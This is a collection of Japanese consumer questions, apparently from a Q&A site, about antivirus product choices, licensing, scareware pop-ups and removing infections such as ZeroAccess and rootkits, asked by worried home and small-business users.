Windows XP SP3でFirefoxを使っています。 NoScriptを ttps://addons.mozilla.org/ja/firefox/addon/noxcript/ からFirefoxに追加したのですが、install後 ttp://noscript.net/?ver=2.6.4.2 のタブがでて、その右上にNow that you've installecd Noscript, we recomment you can your system for issued affecting your PC performance. とか書いてありました。クリックしてつながったのが「無料スキャンでWindowsに影響するエラーを検出」と言ってUniblueというところのSpeedUpMyPC2013のサイトが出てきました。どうも怪しげで最初のNoScriptのサイトがインチキサイトかと心配になります。これはまともなものをInstallしたのでしょうか？
Security BOSS ゲートウェイ・セキュリティ運用監視サービスについて、よく分からないのですが、不正アクセスについて教えてください。会社で導入を検討しております。休日など、自宅PCで会社PCメールをチェックしています。（特別やましい事はしていないのですが、ocnのホームページより、メールアドレスとパスワードを入力してアクセスしています。） (1)　導入後、アクセスは出来なくなるのですか？ (2)　報告とかされるのですか？ (3)　申込後、利用開始までどのくらいの期間がかかるのですか？ 　　　工事とか、装置の設置とかあるのですか？
現在スマホを使っているのですがウイルス対策ソフトを1つもインストールしてません。 オススメのアンチウイルスソフトを教えてくださるとうれしいです。 主にスマホでやっている事はメール、電話、アプリ、ネットサーフィンくらいです。 機種はdocomo　AQUOSPhone　zeta　SH-02Eです。 くわしい方宜しくお願いします。
au の androidスマホで、2chmateというアプリで、ニュース速報板のスレを開くと スマホに入れているウィルスバスターが Web脅威対策によるブロック アドレス:hayabusa3.2ch.net/test/read.cgi/news/1357970050/ 種類：不正プログラム配信 評価：危険 を表示して、ブロックしてくれているようなのですが 2chmateで、2chのニュース速報板の、どのスレを開いても、このようにブロックされます。 その他の板のスレでは、今のところブロックは出ていません。 そもそも、2chのスレを開くだけで危険なことがあるでしょうか。 しかも2chのスレをブラウザで見ているのではなく、2chmateというアプリで見ています。 ウィルスバスターが間違っているのではないでしょうか。 それとも本当に危険だったのでしょうか。 詳しい方いらっしゃいましたらアドバイスいただけるとうれしいです。
今日、アンドロイドスマホを購入しました。無料のセキュリティ対策を導入したいのですが、全くの素人でわかりません。ご存知の方、お勧めがあれば教えてください。 ちなみに　インターネットで簡単な検索と、アマゾンなどで買い物をする程度の利用です。 クレジットカードを利用するので、セキュリティは必要かなと思いました。 よろしくお願いします。
先日　マカフィー　セキュリティセット・プレミアムに更新したマカフィーが不具合をおこしてます。 ファイルを開いてもデスクトップ上で何も写ってない。 何も写ってないのでセキュリティーの更新ができない。 ２～３回　ファイルを再インストールしても結果が変わらない。
WEB上でも新聞紙上でも　今非常に危険だと騒がれていますが、実際の対策はどうするのがBESTなのでしょうか？ JAVA　７をアンインストールしてJAVA6をインストールして当座をしのぐという方法はいかがでしょうか。
パソコンのバックアップですがどれをすべきですか？ よくわかりません。 写真とか音楽はパソコン以外にUSBやSDにもコピーしておくこともバックアップとすると これ以外にはどれをバックアップしたほうがいいですか？
NTT西日本のセキュリティ対策ツールをインストールしたのですが、Google　chromeのツールバー（右上）にカプセルの形をした、Web安全性評価　が出てくるのですが、カプセル自体出て来ないんです。 通常使用するプラウザとして設定しても、対応Webプラウザにセキュリティバーを表示する設定しても、NTT西日本のサイトで調べても、解決策が見つからず。 サイトにお問い合わせしようとしても、色々osやらたくさん書くことがあり・・・面倒くさくて。 回答お願いします、、、
現在ウィンドウズ７使っています アンチウイルスはESET使っています。 去年まではウイルスバスターをつかっていたのでESETでは今のところ問題はないのですが不安です。 クレジットカードによるネットショッピング。 オンライン株式。 オンライン銀行では半分くらいは安全のため画面上に表示されるキーボードで打ちます。 その後、閲覧の履歴の削除とESETで検査をさせます。 これは気休めにしかならないです。 いつウイルスにかかるか不安です。 同時ではないですが、エロイサイトも見ます。 今の時代エロイサイト以外でもウイルスにかかることはありますがどうしたらウイルスにかかりますか？ ファイル共有ソフト フィッシング詐欺などのメールへのクリック 上記にはかなり気を付けています。 ウイルスにかからないようにしたいです。ご意見よろしくお願いします。
ここに書かれていることは本当のことですか？ http://detail.chiebukuro.yahoo.co.jp/qa/question …
ウイルスソフトで Ａ． 無料の「ＫＩＮＧＳＯＦＴ」を試してみようと、思います。 http://www.kingsoft.jp/is/ Ｂ． 有料の「ウイルスバスター、ノートン、マカフィー」と比べて 信頼性はどうでしょうか？ Ｃ． 「問題ない、ただ、広告のポップアップがよく出るのがウザイ、と言ってました」 Ｄ． 他にも「無料　ウイルスソフト」のお勧めはありますでしょうか？ 宜しくお願い致します。
パソコン（windows7）のウィルスセキュリティソフトを、マカフィーからスーパーウィルスセキュリティゼロ（ダウンロード版）に変えようと思っています。 その方法がいまいちわかりません(´・ω・｀) 先にダウンロードすれば、二つのソフトがぶつかってしまいますよね…？ 先にアンインストールすると、ウィルスが侵入しますよね…？ どうすればいいか、教えてください(>_<)
現在のソフトの契約期限に合わせて、新たに別ソフトを契約して入れ替える予定です。 もし、現ソフト削除後にインストールするとトラブル等で空白期間が生じます。その間使用しないということになりますが。　　　　　　ダブッテインストール後旧削除は不可でしょうね。 期限に合わせて新規契約、インストールをする合理的手順あれば教えて頂けますか。 例えば一か月程度ダブって契約してその間新規インストールができるまでその都度現ソフトを入れたり削除したりできるものでしょうか。現ソフトはダウンロードです。
symannteckといえばノートンのセキュリティソフトになりますが、当サイトへの登録は利用料が無料と理解して登録しましたが相違ありませんか？
自宅のパソコンでデータのやり取りをする時にウイルスなどが心配なんですが、最低限どんな事をしたら良いですか？ ウィルスバスターには入ってますけど、それだけで最低限心配する事は無いんでしょうか？ よろしくお願いしますm(__)m
NORTON 360 マルチデバイスについて質問させてください。 こちらの商品は、「パソコンやMac、スマートフォン、タブレットなどの デバイスを３台までまとめて保護することができます。」とありますが、 (1)パソコン、スマートフォン、タブレット、それぞれ専用にシリアルナンバーがあるのでしょうか。それとも、３つのシリアルナンバーが与えられていて、その３つのシリアルナンバーをどれに使用してもよいのでしょうか。 (2)私は、タブレットをもっていないのですが、スマートフォンに一つ、パソコンに2つ（つまり、最初の1年間は一つのシリアルナンバー、2年目には、もう一つのシリアルナンバーを使用）使用できるのでしょうか。 すみませんが、ご存知の方がおられましたら、ご教授ください。
フリーのセキュリティソフト、及び無線LANについて教えてください。 現在、自宅にて２台のノートPCを使用しています。 【メインノート】 WindowsXP インターネット等を家族で使用。 ESET Smart Security 5.2 無線LAN接続 →まだ、子どもが小さく、破損の恐れもあり、古い方のPCをメインとして家族で使用しています。インターネットを多く使用するため、セキュリティソフトも有料のものを導入しています。 【サブノート】 Windows７ 私個人が文書作成等、主に仕事に使用。 KINGSOFT Internet Security 2013（フリー） 無線LAN接続 →最近、新たに購入したPCです。無線にてインターネットも可能な状況です。しかし、セキュリティソフト代金が惜しいためフリーのセキュリティソフトを導入し、サブ機として使用しインターネットは極力避け、文書作成等の仕事用にしようかと思っています。 Windows等のアップデートの必要性を考え、サブ機も無線にてネット環境は整えてあります。 さて、この状況はやはり危険でしょうか。 ・サブ機は絶対にインターネットをするべきではない。 ・メールは絶対だめ。 ・無線につながっている時点で、ウィルスが入る危険性がある。 ・サブ機は無線はやめたほうがよい。 ・自動アップデート機能をオフにしおくほうがよい。 など、何かアドバイスをいただきたく質問させていただきました。 よろしくお願いいたします。
自営業手伝いです。 現在２台ネットワーク接続しているPCがあるのですが 知り合いから、顧客情報などが入っているPCはネットと切り離したほうが得策だと言われました。 そう言われてみると、メールやHPの閲覧からウィルスに感染したり、知らないあいだに情報が抜き取られている被害が多いとよく耳にします。 うちの会社はファミリービジネスの小さい会社なので、意図的にどこかから狙われるとは到底思えないのですが、メールに入ってくる融資の話や知らないところからのメールを見ていると、やはり出来ることはやっておいたほうが良いかなとも感じています。 その場合、通常なら入れておくウィルスソフトは必要ないのでしょうか？ また、PC自体のアップデートなどはネットにつながなくてはできないと思うのですが それはどうやって行ったらよいのでしょうか？ 明日から仕事始めなので、今年は少しネット環境を見直して整備しなおそうとおもっています。 よろしくお願いします。
暴露ウィルスについて 暴露ウィルスに1番有効な対策は何でしょうか？ 守りたいファイルは頻繁に使用するものなのでファイル単位での暗号化はできません。 調べてみるとドライブやフォルダを暗号化しても常駐しているウィルスには効果がないとの記事を見ました。 また、今のウィルス対策ソフトはフリーのアバストとSpybot-SDを使っていますがこれを有料版にすると見違えるほどの効果があらわれますか？ 以上の暗号化と対策ソフトの2点について教えてください。
Windows 8 パソコンを購入しました。Windows をセットアップして、ノートンインターネットセキュリティ2012を導入しようとしているのですが、DVDをドライブに入れたのはいいのですが、これからどうしたらいいのでしょうか。ちらっと何かメッセージが出たのですが直ぐ消えてしまいました。困っています。よろしくお願いします。
大学の入学祝で近々VAIOのEシリーズを購入予定なんですが、ウイルス対策のソフトをマイクロソフトセキュリティーエッセンシャルにしようと思うのですが、最新のWindows8にも対応しているのでしょうか。 ちなみにパソコンの使用用途としてはネットや動画閲覧、レポート作成が主です。 また、期限など他社製品にあるようなものもあるのでしょうか。
ウイルスバスタークラウドのweb脅威というのはどういった基準でweb脅威になるのでしょうか？ アクセスした覚えのないサイトがいくつかあるのですが、web脅威として扱われているサイトは全て自分がアクセスしたサイトなのでしょうか。
ウイルスバスタークラウドは1本の購入でパソコン3台まで使えるとありますが、 パソコン２台とネクサス７でも使えるのでしょうか。
Appleから、AppleIDの情報変更というメールがあり、した記憶がないので、ID情報をみたら、外国人（国は台湾となってます）になってました。怖くなって、パスワードだけ変更したのですが、請求先や名前など外国人のままになってます。Appleに連絡したいのですが、メールしかないのでしょうか？ iPhoneから見てるため、iTunesやAPPが英語になっていてこわいです。 パスワードだけ変更でとりあえず大丈夫なのでしょうか？悪用されて、多額の請求とかこないか心配です。
google chromeでwebサイトをみているとよく http://lp.zpdownload.info/mv/ 上記のサイトに飛ばされてしまいます。 これはウイルスのせいでしょうか またサイトをクリックしてそのサイトへ飛んでも前のサイトに勝手に戻ってしまう現象があります
Windows7、ＩＥ8なのですが、ブラウザのみならずエクセルやDocuworkの画像もプレビューが異常で印刷もできなくなり困っています。 ちなみに印刷用アプリケーションは通常のプリンターの他に、DocuworksとＰＤＦです。 まずブラウザですが、ページを印刷しようと思いプレビューを表示すると、最初は余白がやたら多くて、画面の一部が大きく映っていました。ヘッダーとフッターは文字が大きく表示されています。 ページ設定で直せないかと思い見てみると、余白が百数十とか４百数十という大きな数値になっており、直そうと入力してもすぐ数字が戻り直せませんでした。 そうこうしているうちに日本語の文字入力もできなくなったのでオフィスの修復をしてみました。 そうすると、余白の修正はでき、Docuworksへ印刷はできるものの、プリンターとＰＤＦでの印刷ができない状態となっています。詳細設定ボタンを押しても反応しない状態です。 次にDocuworks文書を印刷しようとすると、プレビュー画面は最初はやはり左側の余白が大きな状態で画像が右寄りになり、全体を表示することができませんでした。 その後（オフィス修復後）、プレビュー自体、真っ白な画面しかでなくなりました。 もちろん、プリンターへもＰＤＦでも印刷できません。 言葉で説明してもわかりずらいと思いますが、検索しても同様の症状に関するものが探せず、ウイルスの仕業も考えられると思い、こちらに投稿しました。 よろしくお願いします。
定義ファイル更新のダウンロード速度が遅いのでイライラさせられる時（大型定義ファイル更新時・再インストール時）があります。 ネット回線はWiMAXを使っていますが、ウイルスバスターの時はすぐに完了していたので、 WiMAXのバックボーンが原因ではないと個人的には考えています。 定義ファイル更新が遅いのは、 サーバーがロシアにある？為かロシアから日本へのバックボーンが細い？為か分かりませんが遅いです。 2012・2013とも速さは同じです。（実行転送速度約90～220kbps） Windows 8を使っています。 皆さんはどのOSや回線をお使いで実行転送速度はどれくらいですか？ 遅い原因は何でしょうか？ 広く皆様から実態をお知らせ頂ければと思います。 宜しくお願い致します。
無料のセキュリティソフトを探しています お勧めのものがあったら　教えてください
ウチのノートパソコンが、どうも「ゾンビ」になってるようです。 まず、なかなかネットにつながらなくなった、動作が遅くなった、いきなりネットにつながらなくなる、今さっきは、DVDドライヴに入れてたCD-Romがブンブンうなりながら何分間だったかな、回っていました・・・。 ノートンのセキュリティソフトを使っていますが、ウィルス・スキャンで何もウィルスは検出されませんでした。 復元を2回してみましたが、動作は変わらず。 おかしなリンクは・・・この前あった遠隔操作事件みたいな・・・踏んずけていません。 新種のウィルスだとしたら,秋葉原の修理屋さんでも修理してもらえますか？ かなり悩んでいます、 メーカに持って行くのと、修理屋さんに出すのとどっちがいいんでしょうか？ また、外国の有名なVPNソフトを提供している、そのソフトをインストールしてからおかしくなりました。 感覚として、ウィルスに感染しているのは間違い無いと思います。 面倒なので、修理屋さんにとっとと持って行きたいのですが、 どこの修理屋さんがいいでしょうか？ 東京23区内在住です。 よろしくお願いいたします。 一応、修理屋さんの検索はしてみましたが、 どこがいいのかわかりません。
こんにちは パソコンのセキュリティソフトの最適化について、お尋ねします 先日、セキュリティソフトを別のものに変えました 以前のものは、そういうメッセージは出てきませんでしたので、最適化、して良いのか、わかりません インストールした直後に、そのメッセージが出て、と同時に《削除します、復元は出来ません》とありましたので、一体何を削除するのかも不安で、そのままにしました 削除する項目も、私には見当たりませんでしたし、最適化をしませんでした 立ち上げる毎、最適化（実行）のボタンが出てくるので、迷っています 色々操作など不慣れです、、よろしくお願いします
microsoft security essentials これが入っているパソコンを使用しています。 いま疑問に思ったのですが、そしたらウイルスバスターを入れなくても良かったのでしょうか？または、必要ですか？ いまさらの疑問なのですが、教えてください。vistaを使っています。
カスペルスキー2012でトロイの木馬を発見したので処理したところ、現在は「脅威：なし」「保護されています」と表示されています。そのレポート内容を確認すると「HEUR:Trojan.Script.Iframer」との検知結果が見られました。これを削除しようと「削除しますか→はい→隔離とバックアップフォルダーにあるファイルを削除しますか？→はい」との手順を踏んだのですが、削除できません。あくまで検知結果なので削除できないのかなとも思ったのですが、他のウイルスの検知結果は削除できるので、そういう訳でもなさそうです。また、（冒頭の）処理後にこのトロイのファイルの元の場所（temporary internet files）を開くとデータが確認できたので、Deleteによる削除後ゴミ箱を空にするという手順を踏みました。その後のパソコンの再起動時に、「ゴミ箱が壊れています」といった表示が現れ（ゴミ箱内のすべてのファイルの削除により取りあえず現在はOKです）、さらにトロイの住処（temporary internet files）にまた彼が蘇っていました（取りあえずまた削除）。その後再起動等を何回か繰り返し、今現在はトロイの復活は見られませんが、もしかしたら午前０時を過ぎると自動的に復活したりするのかななんて思います。一応カスペルスキー上では「脅威：なし」と表示されていますが何だか不安です。ちなみにネットのキャッシュ等は削除しています。データが色々入っているので、リカバリは避けたいですし、復元もなるべく避けたいです（復元してもトロイだけ居座りそうな気もしますし、よく見ると同タイプのトロイがもう一つ、結構前にも検知されていたみたいなので（＝復元ポイントが古くなる））。レポート検知結果の削除方法とトロイの完全撲滅方法がもしありましたら、どなたか易しくアドバイスいただけませんでしょうか？
１．windowsインストール、認証 ２．デバイスドライバインストール ３．アプリケーションインストール、認証 ４．マイドキュメントにデータコピー １２３４どの段階でシステムバックアップを取ることがクリーン状態のシステムバックアップに該当しますか？早い段階だと手間的にクリーンインストールと変わらないし遅い段階だとセキュリティが保ててない状態のバックアップに意味があるのか疑問なのですがどの段階でバックアップが最善でしょうか？
数日前からPCを起動している際に急に動かなくなることが続き 強制終了などして再度立ち上げると立ち上がるんですが すぐ固まって動かなくなります マカフィーでは保護されています とでていますが、フルスキャンを実行しようとすると まるで動きません 昨夜は一度数時間かけて1パーセントスキャン完了 の状態のままだったので再度強制的に終了しました 今朝みても状況は変わっておらず タスクマネージャーをひらいてみると プロセスのところにたくさんでています！ basic.exe.＊32 CFSwMgr.exe csrss.exe dwm.exe などなど70列ほどでています cpu はみな0なんですが、 dwm.exe tskmgr.exe は、1になったりします あとメモリは basic.exe＊32 CFSwMgr.exe などが動いています どこに連絡したらいいのか どう対処すればいいのか まるでわからず困っています！ 大切なデータもたくさんはいっているので もしこれがウイルスなのなら お願いです！早急に対処方法教えてください！ よろしくお願いします！！
セキュリティソストでノートンを入れています。 しかし最近あらゆるところで「ＰＣパフォーマンスが低下してる」とかスキャン開始とか訳の分からないことが頻繁にあります。 先に進むと「購入する」画面になります。 キャンセル画面にしてもなかなかできずに困っています。 それと、最近証券会社と名乗る変な電話も自宅に頻繁にかかるようになりました。 いつも断るのですがしつこくて困ってます。 私がインターネットで買い物が多いので情報流失の可能性はありますか？ 主人から電話は入力してはいけないと言われ落ち込んでいます。 今も「advanced system purotetor」というわけのわからないところからアラート警告が発信されています。 この名前は毎回しつこくていつも警告発信が来ます。 どうしたらいいでしょうか？ ノイローゼになりそうなので解決方法を知っている方是非ご回答お願いいたします。(>_<)
お世話になります。 昨日ESETでPCのフルチェックをしたところ、メモリ上に駆除できないウイルスが見つかりました。 ESETで詳しく調べると、system32内の「gdiplus.dll」「comctl32.dll」などのファイルに関わるすべてのアプリケーションが状態で最も危険な「９：危険」となっていることを確認しました。 ファイルのウイルスチェックで上記のファイルも検索しましたが、検出はされず、検出されたのは「Net FrameWork」の「AppLaunch.exe」でした。 どうにかこちらのファイルを駆除する方法はありますでしょうか？ よろしくお願い致します。 【試してみたこと】 (1)セーフモードで試したものの駆除には至りませんでした。 　（そもそもESETがカーネル起動の失敗でセーフモードでは立ち上がりませんでした） (2)ESET sysRescueから起動前にウイルスチェックも試みようと思いましたが手持ちのPCが一台しかなくまたWindows8であったため、ESET sysRescueには対応しておらずこちらも断念しました。 Windows8のシステム修復はまだ試してはいませんが、オンラインで購入したためディスクがないのですがこちらシステム修復で効果は期待できますでしょうか？
知人に勧められて、Microsoft Security Essentialsを 使用するようになりました。 無料ソフトゆえ不安もありますが、 利用されている皆様いかがなものでしょうか。
Windows7のファイアウォールについて質問です。 マカフィー入れてるのですが、パソコンを起動すると「ファイアウォールが無効になっています」と毎回警告されます。焦ってすぐに有効にするのですが、一度有効にしても数十分後に同じ警告が出ます。。。 Windowsファイアウォールを開いて、有効化にしようとすると、「ファイアウォール設定の更新」というのになっていて、「推進設定を使用します」を押すと、Windowsファイアウォールは一部の設定を変更できません。と出てきて、できません。エラーコード0x80070424を吐かれてしまいます。 Windowsアップデートでも更新に失敗します。関連しているのでしょうか？ 復元も試しましたが、何時間待っても画面が変わらないのでブチしてしまいました。 この前アプリケーションのスタートアップを手動に変えたり無効にしたりしたのですが、もしかしてその時にいじってしまったのかもしれません。 とても不安です。治し方を教えてください。回答お願いします。 長文失礼しました。
windows8環境の自作PCの組み立てを行っています そこで、windows8で利用できるアンチウイルスソフトとファイアーウォールソフトで皆様のオススメを教えていただきたいです。 フリーでも有料でも構いませんが、良い点と（あるならば）悪い点を添えて教えていただけると嬉しいです 個人的な好みなのですが、ファイアーウォールはCOMODOファイアーウォールのようにアプリケーションごとにインターネットへのアクセスを許可する/しない　を選択できるものであると嬉しいです COMODOのファイアーウォールがバージョン6へとアップデートされ、個人的に非常に使いにくくなったため今回質問させていただきました。
google chromeにtrendツールバーをもう一度入れる方法を教えてください 質問文の通りです OSはWindows vistaです メーカーは富士通です 機種はFMV-BIBLO NF70Wです ウイルスバスターはウイルスバスター2012クラウドです google chromeのバージョンは23.0.1271.97 mです google chromeからtrendツールバーを削除してしまい困っています なので,google chromeにtrendツールバーをもう一度入れる方法はありますか
Firefoxで,yahooやgoogleの検索結果にtrendツールバーの緑のマーカーなどの出し方を教えてください OSはWindows vistaです メーカーは富士通です 機種はFMV-BIBLO NF70Wです 質問文の通りです ウイルスバスターはウイルスバスター2012クラウドです FirefoxのバージョンはFirefox 17.0.1です
Windows ファイアウォールは使用しても大丈夫なのでしょうか？ あるソフトと競合するので、PC Tools Firewall Plus と COMODO Firewall が使えなく、Windows ファイアウォールを使おうと思っています。 しかし、色々調べていくとWindows ファイアウォールの評判がよろしくなく、危険かと思い大丈夫なものか教えていただきたく思い、質問させて頂きました。 私の環境 Windows 7 Home Premium 64-bit ウィルスソフトはavastを使用
Conduit Engine　ってのが、勝手にインストールされています。 ウイルス、ですか？ トロイの木馬、ですか？ マルウェア、ですか？ 偽ソフトウェア、ですか？ 消去して問題ないでしょうか？ そして、どんな危害があったか教えてください。
「ウイルスバスター クラウド 保険&PCサポート」を購入しようと思います。 >>http://safe.trendmicro.jp/purchase/vb/premium.as … サポート提供は「スリープロ株式会社」という所らしいのですが、 PCサポート先の電話番号が分かりません。 質問するときは、IP電話の使える番号（スマートフォン）で、「スカイプ」や、「050＋」を、 使っていきたいと思うのですが・・・ 例えば、0570で始まる番号だと、IP電話の使えるスマートフォンからでは、 かけることができません。 どのような、番号か？お分かりでしたら、教えてください。
ある会社の通信教材を申し込んでＤＶＤが届いたので早速見ようとｐｃに入れてみたのですが、 AVIRAのウイルス検出でぴこっ！という音が鳴りなんだろうと思って見てみると、 Ｄ：￥PlayDVDC.exeという場所にＴＲ/ＡＴＲＡＰＳ.Gen2というウイルスが入っているという警告が出ました。 検索して調べてみるとトロイの木馬のようです。 AVIRAの警告がでたときの削除ボタンを押したのですがそれでもう大丈夫なのでしょうか？ よろしくお願いします。
GEMAと馬の顔のような絵とお金を払えばロックを解除するという英文が表示され、PCがロックされたままです。助けてください。お願いいたします。
ウィニー等を検索していたら、RIARES17INIとRIARES27INIというファイルが検出されました。削除できないのですがどうしたら削除できるでしょうか。
今回私が使用しているセキュリティソフト(eset)でマルウェアとして検出されたものが 有りましたのでvirus totalで調べてみました。 結果2つのアンチウィルスがウィルス定義に入れているようです。 これはそんなに危険なファイルでは無いのでしょうか？
先日から、ＰＣを立ち上げると、見たこともないファイルを「インストールしますか」というメッセージが、ウイルスチェッカーからきます。おかしいと思いインストールはしていませんが、ＰＣを立ち上げる度に出ます。このファイルを消す方法を教えてください。
１ヶ月ほど前、File Restoreに感染し、素人なりに駆除したつもりだったのですが、ルートキット型ウィルスにも感染していたようで、駆除出来ず困り果てています。 この場合リカバリーをすれば、ルートキット型ウイルスもパソコンから無くなり、購入前の状態に戻るのでしょうか？ 感染した経緯としましては、eoで契約をしており、月額版のウイルスバスターも入っているのですが、あるサイトにアクセスが出来ず、ウイルスバスターのファイアーウォール機能のせいかな？と思い、ウィルスバスターを一旦停止させたのですが結局そのサイトにはアクセス出来ず、再度ウィルスバスターを立ち上げたところ、その直後にFile Restoreというウィンドウがたくさん立ち上がり、デスクトップのアイコンなども消えてしまいました。 家族のパソコンを使ってインターネットで調べたところ、ウィルスのようなものだとわかり、以下のサイトを参考に駆除を試みました。 http://www.geocities.co.jp/Playtown-Yoyo/6130/no … 上記サイトに書かれていた 『Malwarebytes Anti-Malware Free』 『Unhide』 をインターネット接続したまま通常通りに起動し、実行したところ、File Restoreというウィンドウは立ち上がらなくなり、デスクトップアイコンも表示されましたので、とりあえずは駆除出来たかなと喜んでおりました。（セーフモードで起動した方が良かったのでしょうか？） ただ、【スタート→すべてのプログラム】で表示されるプログラムの数はかなり減っておりましたが、パソコンの調子がもともとあまり良くなかった為、時間がある時にリカバリーでもしようかと思っていたので、そのままパソコンを使い続けていたのですが、その後インターネットへの接続速度がどんどん遅くなっていきました。 さらに、yahooなどで何か語句を入力して検索し、その検索結果をクリックすると、別のサイトに飛ばされる事がごく稀にあり、さすがにパソコンの調子が悪いという問題ではないなと思い、もう一度よくよく上記サイトを読み直してみると、ルートキットの複合感染の事が書かれており、症状について調べてみると、私の体験したものと同じでした。 http://lhsp.s206.xrea.com/misc/virus-tdss-rootki … ↑上記サイトをもとにルートキットの駆除も試みたのですが、 ●『TDSSKiller』 ●『FixTDSS』 はクリックしても無反応で起動できませんでした。（ちなみに家族のパソコンではちゃんと起動出来ました） ●『FixZeroAccess』は実行しようとするとエラーが出て実行出来ませんでした。 ●『Dr.Web Cure It』は起動してスキャンも出来ましたが、何も見つかりませんでした。 ●『Rootkit Remover』では以下のような結果になりました。（「～」の部分は長いので省略しているだけです） Malware Found --> ZeroAccess trojan detected!!! --> Registry key: ～ ( fixed ) --> Malicious file: ～ ( will be deleted after restart ) --> Registry key: ～ ( fixed ) --> Malicious file: ～ ( will be deleted after restart ) ZeroAccess trojan was cleaned successfully! Error Loading Service Please ensure to run this tool as administrator. 上記の文章を読む限り,ZeroAccess trojanが見つかったが、再起動後に悪意のあるファイルは削除されると書かれていますし、駆除に成功したと書かれているように見えるのですが、「Error Loading Service」というのが気になります…どういう意味なのでしょうか？ ZeroAccess trojanの駆除に成功したのであれば、立ち上がらなかった『TDSSKiller』『FixTDSS』は立ち上がるようになっているかも？と思い、再起動後に立ち上げてみたのですが、やはり立ち上がりませんでした。 また、気になるのがデスクトップに『File Restore』のショートカットの残骸が残っておりますが、削除しようとすると、懐中電灯マークが出てきて元ファイルが見つからない状態です。 こういう状態でリカバリーした場合、ウィルスやルートキットに感染する前の綺麗な状態に戻るのでしょうか？（パソコンは富士通製で、リカバリーCDなどはすべてあります。Windows XPです） 戻らない場合、何か対処法はありますか？ パソコンの用語をあまり知らず、素人でもわかるように書いて頂けると助かります。 本当に困っておりますので、わかる箇所だけでも結構です。どうかアドバイスよろしくお願いいたします。
購入した海外ゲームを遊ぶために修正プログラム俗にパッチと呼ばれるものを 探していたのですが、なんとなく怪しい場所にいきついてしまったので exeファイルだったということもあり、保存する際に意味があるのかないのかわかりませんが 目立つように名前を変えて拡張子も潰して保存しました。 ファイルの実行を行う前にノートンさんで検査してみようかと思ったからです。 ところがダウンロードした場所にファイルがみつかりません。 使用していたブラウザはfirafoxです。 “ダウンロード”のウィンドウにて、ダウンロードしたファイルの履歴をみたのですが、 ファイル名のテキスト部分が白く反転されてあり、 通常そこから居場所を特定できるはずなんですが、そうした操作ができなくなってました。 ファイルの実行は選択できるようになってますがもちろんそんなことはしたくないです 慌てて該当PCの回線を引っこ抜いてウィルススキャンしてみたのですが、 特に何も検出されませんでした。 以前のバックアップファイルでOSをもとに戻すしかないのでしょうか かなり負担になってしまうので自分のパソコンに何が起こってしまったのか だけでも知るすべを教えて下さい。 ※ファイルをダウンロードしてくる時点でノートンが検査しているのかもしれませんが、 あろうことかその際にノートン等の各種の自動起動アプリが立ち上がっていない状態でした。
現在「ウイルスバスター」を利用しておりますが、やがてその期限が到来します。 巷間「カスペルスキー」が有能だとの話を聞くことがあります。 現在「カスペルスキー」をご利用なさっておられる方から、「カスペルスキー」ついての感想を お聞かせいただきたいと思って投稿しました。 よろしくお願いします。
最近youtbeやiTunesなどで動画・音楽を再生していると、 途中でブーとなって止まってしまうことが多々あります。 iTunesで音楽を再生するとき（つまりインターネット関係ないもの）もです。 先週windows security alertというのが突然インターネットをしているときに 出て来たのですが、それとの関連はあるのでしょうか。 その時はウイルスバスターや、McAfeeなどのウイルス対策ソフトを使ってみたところ、 何も検知されなかったため、特に対策はしませんでした。 ちなみに現在も何も検知されません。 何か対処法のわかる方がいたら教えてください。
こんなページを見つけたんですが、ネットにつないでないPCでセキュリティソフトの更新してる人ってどのくらいの割合なんでしょうか。 http://support.kaspersky.co.jp/faq/?qid=208290731 ネットのない環境でPCを使ってる人に質問です。 使ってるセキュリティソフトと、何日に一度くらいの頻度でウイルス定義を更新しているか教えてください。ネットにつないでないPCで更新する意味ってなんでしょうか。
古くなったパソコンに昨日Nortonの無料体験版をインストールしてウイルススキャンをしたところ、ウイルスが２つ見つかりました。見つかったウイルスは「検疫」されて、「検疫済み」となっています。 そこで質問させてください。セキュリティソフトであるNortonを削除した場合この「検疫」されたウイルスはどうなってしまうのでしょうか？　ウイルス自体は削除されていないのでNortonを削除してしまうと「検疫」されたウイルスがまたPC上に戻って悪さをはじめるのではないかと想像しているのですが、どうでしょうか？　パソコンに詳しい方、アドバイスよろしくお願いします。
以前、ソースネクスト、マカフィー、キングソフトを使った経験があります。 WindowsXPと７にウイルスバスタークラウドをインストールしてますが、XPの動作が鈍いです。 最近、マイクロソフトセキュリティエッセンシャルズがあることを知り、XPにいれたところ、動作の鈍さは改善されました。 特に大事なデータとかないので ウイルスに感染したとしても、再インストールすれば良いだけですから。 それに、必要なデータは、外付けHDDに保存してます。 軽いなら、７にも入れてみようかと考えました。 しかし、以前XPに入れていた、キングソフトは、無料でしたが、広告だけならまだしも、中国語で書かれた、訳のわからないメッセージが出たり、修了時に「ガンッ」っといってエラーが表示されるなどして、結局は、ウイルスバスタークラウドにしたのですが。 もし、エッセンシャルズも、そのようなものが出たら、面倒だとも思ってます。 実際どうなのでしょうか？ まぁ。マイクロソフトが提供しているものだから ウインドウズとの相性はいいのではと思っているところですが。
他のソフトとの関係で一時的に　ウイルス対策ソフト　microsoft security essential の機能を停止したいのですがその方法が分かりませんので教えてください。お願いいたします。
マイクロソフトセキュリティエッセンシャル（ＭＳＥ）をダウン・ロードしようか迷っています。 従来は、プロバイダーがサービスしているセキュリティー・プログラムを利用してたのですが、 サービス終了で代るセキュリティー手段を検討中です。 メリット、デメリットにお詳しい方のアドバイスをお願いします。
2012の3台3年版を利用しています。windowsをリカバリしたいのですがkasperskyのアクティベーションを一時的に返還するにはどうすればいいのでしょうか？昔別のセキュリティソフトでリカバリしたら台数オーバー扱いで電話する羽目になったことがありますので慎重です。何もせずリカバリしてkasperskyを入れたら二台にしかインストールしてないのに3台使用済み扱いになったりしますか？windows7のアクティベーションは同じPCであればリカバリしても一台は一台としか判定されませんがkasperskyはどういう構造になってますか？教えてください。
お世話になります。 　起動時、画面が真っ暗なままで、画面の下に添付のような顔が出てくるようになりました。 　顔文字のような('▼')みたいなのです。 　何度かキーをたたいていると起動はしたのですが、これってウィルスでしょうか？ 　顔、ウィルス　などで検索しても、サルが出てくるものくらいしかヒットせず、該当するものがありませんでした。 　症状や画像からウィルス名を検索するようなサイトってないのでしょうか・・・
スマホのウィルス対策についてお聞きしたいのですか… 昨日auのXperia(TM) VL SOL21を買いました。 契約は済んでるんですが、在庫がなかった為商品が届き次第使えるようになります。 始めてのスマホなので、ネットで調べているとウィルス対策に目が止まりました。 スマホが使えるようになったらすぐにウィルス対策した方がいいんでしょうか？ また有料、無料沢山あってどれを使えばいいのか迷います。 カスペルスキーが少し気になったのですが有料の方が安心でしょうか？ お勧めなどあれば教えていただきたいです☆ よろしくお願いします。m(_ _)m
